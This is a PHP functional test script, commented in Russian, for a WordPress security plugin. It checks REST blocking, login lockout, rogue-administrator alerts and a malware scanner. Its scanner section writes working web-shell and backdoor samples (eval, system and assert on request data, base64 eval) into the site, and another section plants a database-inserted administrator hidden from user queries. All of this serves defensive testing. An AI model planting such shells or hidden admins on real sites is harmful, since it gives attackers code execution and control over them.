<?php
// Функциональные тесты FYZI Guard. Запуск: wp eval-file run.php (только на тестовой копии WordPress!)
$GLOBALS["pass"] = 0; $GLOBALS["fail"] = 0;
function t($name, $ok, $extra = '') {
    global $pass, $fail;
    if ($ok) { $pass++; echo "  ✓ $name\n"; } else { $fail++; echo "  ✗ $name" . ($extra ? " — $extra" : '') . "\n"; }
}
function log_has($text) {
    foreach (FYZI_Guard_Log::all() as $e) { if (strpos($e['message'], $text) !== false) return true; }
    return false;
}
function findings_have($title, $pathPart = '') {
    foreach ((array) FYZI_Guard_Settings::state('findings', array()) as $f) {
        if ($f['title'] === $title && ($pathPart === '' || strpos($f['path'], $pathPart) !== false)) return $f['severity'];
    }
    return false;
}
$admin = get_user_by('login', 'tester');

echo "1. Защита\n";
wp_set_current_user(0);
$r = rest_do_request(new WP_REST_Request('POST', '/batch/v1'));
t('гость: /batch/v1 заблокирован (403)', $r->get_status() === 403, 'статус ' . $r->get_status());
$r = rest_do_request(new WP_REST_Request('GET', '/wp/v2/users'));
t('гость: /wp/v2/users закрыт (401)', $r->get_status() === 401, 'статус ' . $r->get_status());
$r = rest_do_request(new WP_REST_Request('GET', '/wp/v2/posts'));
t('гость: обычный REST (/wp/v2/posts) работает', $r->get_status() === 200, 'статус ' . $r->get_status());
wp_set_current_user($admin->ID);
$r = rest_do_request(new WP_REST_Request('GET', '/wp/v2/users'));
t('админ: /wp/v2/users доступен', $r->get_status() === 200, 'статус ' . $r->get_status());
$req = new WP_REST_Request('POST', '/batch/v1');
$req->set_body_params(array('requests' => array()));
$r = rest_do_request($req);
t('админ: /batch/v1 не блокируется плагином', $r->get_status() !== 403 || $r->get_data()['code'] !== 'fyzi_guard_blocked', 'статус ' . $r->get_status());
t('XML-RPC отключён', apply_filters('xmlrpc_enabled', true) === false);
t('редактор файлов отключён (DISALLOW_FILE_EDIT)', defined('DISALLOW_FILE_EDIT') && DISALLOW_FILE_EDIT && !current_user_can('edit_plugins'));
t('версия WP скрыта', apply_filters('the_generator', '<meta generator>', 'html') === '');
t('пароли приложений плагином по умолчанию не отключаются', has_filter('wp_is_application_passwords_available', '__return_false') === false);

echo "2. Ограничение входа\n";
$_SERVER['REMOTE_ADDR'] = '203.0.113.7';
for ($i = 0; $i < 5; $i++) { do_action('wp_login_failed', 'bot'); }
$res = apply_filters('authenticate', null, 'bot', 'x');
t('после 5 ошибок IP заблокирован', is_wp_error($res) && $res->get_error_code() === 'fyzi_guard_locked', is_wp_error($res) ? $res->get_error_code() : 'не заблокирован');
$_SERVER['REMOTE_ADDR'] = '203.0.113.8';
$res = apply_filters('authenticate', null, 'bot', 'x');
t('другой IP не заблокирован', !is_wp_error($res) || $res->get_error_code() !== 'fyzi_guard_locked');
delete_transient('fyzi_guard_login_' . md5('203.0.113.7'));

echo "3. Наблюдение за администраторами\n";
FYZI_Guard_Log::clear();
wp_set_current_user(0);
$uid = wp_insert_user(array('user_login' => 'wp_update_2', 'user_pass' => wp_generate_password(), 'user_email' => 'evil@example.net', 'role' => 'administrator'));
t('новый админ (создан без входа) → тревога', log_has('Появился новый администратор'));
$cnt = 0; foreach (FYZI_Guard_Log::all() as $e) { if ($e['message'] === 'Появился новый администратор') $cnt++; }
t('тревога не дублируется', $cnt === 1, "тревог: $cnt");

global $wpdb;
$wpdb->insert($wpdb->users, array('user_login' => 'dbghost', 'user_pass' => 'x', 'user_email' => 'ghost@example.net', 'user_registered' => current_time('mysql', true), 'display_name' => 'dbghost'));
$ghost = (int) $wpdb->insert_id;
$wpdb->insert($wpdb->usermeta, array('user_id' => $ghost, 'meta_key' => $wpdb->get_blog_prefix() . 'capabilities', 'meta_value' => serialize(array('administrator' => true))));
FYZI_Guard_Watchdog::check();
t('админ, вставленный напрямую в БД → тревога', log_has('Обнаружен неизвестный администратор'));

add_action('pre_user_query', function ($q) use ($ghost) { global $wpdb; $q->query_where .= " AND {$wpdb->users}.ID <> $ghost"; });
FYZI_Guard_Watchdog::check();
t('скрытый из списка админ → тревога', log_has('Найдены скрытые администраторы'));
FYZI_Guard_Watchdog::approve($uid);
t('«Это мой администратор» добавляет в известные', in_array((int) $uid, FYZI_Guard_Watchdog::known(), true));

echo "4. Сканер: чистый сайт\n";
$findings = FYZI_Guard_Scanner::run();
$crit = array_filter($findings, function ($f) { return $f['severity'] === 'critical'; });
t('на чистом сайте нет критичных находок', count($crit) === 0, implode('; ', array_map(function ($f) { return $f['title'] . ' ' . $f['path']; }, $crit)));
t('ядро сверено (нет сообщения о недоступности контрольных сумм)', !findings_have('Не удалось получить эталонные контрольные суммы с wordpress.org — проверка ядра пропущена'));

echo "5. Сканер: заражённый сайт\n";
$up = wp_upload_dir();
wp_mkdir_p($up['basedir'] . '/2026/09');
file_put_contents($up['basedir'] . '/2026/09/cache.php', '<?php @eval($_POST["x"]); ?>');
file_put_contents($up['basedir'] . '/2026/09/photo.jpg', "\xFF\xD8\xFF<?php system(\$_GET['c']); ?>");
file_put_contents(ABSPATH . 'wp-includes/Fe-dimensions.php', '<?php // backdoor');
$core = ABSPATH . 'wp-includes/class-wp-hook.php';
$orig = file_get_contents($core);
file_put_contents($core, $orig . "\n// injected\n");
wp_mkdir_p(WPMU_PLUGIN_DIR);
file_put_contents(WPMU_PLUGIN_DIR . '/loader.php', '<?php eval(base64_decode("ZWNobyAxOw=="));');
file_put_contents(WP_CONTENT_DIR . '/plugins/hello-ext.php', '<?php if(isset($_REQUEST["k"])){ assert($_REQUEST["k"]); }');

FYZI_Guard_Settings::set_state('findings', array());
FYZI_Guard_Scanner::run();
t('веб-шелл в загрузках найден', findings_have('PHP-файл в папке загрузок', 'cache.php') === 'critical');
t('PHP-код в картинке найден', findings_have('PHP-код внутри картинки', 'photo.jpg') === 'critical');
t('посторонний файл в ядре найден', findings_have('Посторонний PHP-файл в ядре WordPress', 'Fe-dimensions.php') === 'critical');
t('изменённый файл ядра найден', findings_have('Файл ядра WordPress изменён', 'class-wp-hook.php') === 'critical');
t('вредоносный mu-plugin найден', findings_have('Вредоносный код', 'mu-plugins/loader.php') === 'critical');
t('новый вредоносный файл в плагинах найден', findings_have('Вредоносный код', 'hello-ext.php') === 'critical');
t('о новых угрозах есть тревога', log_has('Найдены признаки заражения'));

// уборка
file_put_contents($core, $orig);
@unlink($up['basedir'] . '/2026/09/cache.php');
@unlink($up['basedir'] . '/2026/09/photo.jpg');
@unlink(ABSPATH . 'wp-includes/Fe-dimensions.php');
@unlink(WPMU_PLUGIN_DIR . '/loader.php');
@unlink(WP_CONTENT_DIR . '/plugins/hello-ext.php');
FYZI_Guard_Scanner::run();
t('после уборки критичных находок нет', FYZI_Guard_Scanner::counts()['critical'] === 0, 'осталось ' . FYZI_Guard_Scanner::counts()['critical']);

echo "6. Запрет PHP в загрузках\n";
$r = FYZI_Guard_Hardening::protect_uploads();
t('правило записано в uploads/.htaccess', $r === true && FYZI_Guard_Hardening::uploads_protected());
FYZI_Guard_Hardening::protect_uploads();
t('повторное включение не дублирует правило', substr_count(file_get_contents($up['basedir'] . '/.htaccess'), '# BEGIN FYZI Guard') === 1);
FYZI_Guard_Hardening::unprotect_uploads();
t('правило снимается', !FYZI_Guard_Hardening::uploads_protected());

echo "7. Страница в админке\n";
if (!class_exists('FYZI_Guard_Admin')) { require_once FYZI_GUARD_DIR . 'includes/class-admin.php'; }
require_once ABSPATH . 'wp-admin/includes/template.php';
require_once ABSPATH . 'wp-admin/includes/screen.php';
wp_set_current_user($admin->ID);
set_current_screen('toplevel_page_fyzi-guard');
foreach (array('overview', 'protect', 'notify', 'log', 'pro') as $tab) {
    $_GET['tab'] = $tab;
    ob_start();
    FYZI_Guard_Admin::page();
    $html = ob_get_clean();
    t("вкладка «{$tab}» отрисовывается", strlen($html) > 500 && strpos($html, 'Российская разработка') !== false && stripos($html, 'Fatal') === false, 'длина ' . strlen($html));
}

echo "8. Уведомления\n";
t('Telegram без токена не отправляется и не падает', FYZI_Guard_Notifier::telegram('test') === false);

// уборка тестовых пользователей
require_once ABSPATH . 'wp-admin/includes/user.php';
wp_delete_user($uid);
wp_delete_user($ghost);

echo "\nИтог: пройдено $pass, ошибок $fail\n";
